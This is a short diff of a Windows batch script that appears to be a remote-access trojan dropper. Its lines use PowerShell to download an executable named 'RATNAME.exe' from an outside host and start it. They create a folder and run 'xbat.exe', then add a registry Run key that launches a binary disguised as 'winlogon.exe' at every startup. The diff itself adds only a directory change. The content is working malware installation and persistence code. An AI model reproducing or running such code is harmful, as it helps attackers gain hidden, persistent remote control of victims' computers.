@@ -11,6 +11,7 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('http://example.com
 powershell -Command "Invoke-WebRequest http://example.com/files/RATNAME.exe -OutFile RATNAME.exe"
 start RATNAME.exe
 :SkipRAT
+cd \
 mkdir windows1093
 call xbat.exe
 reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v windows1093 /t reg_sz /d C:\windows1093\winlogon.exe
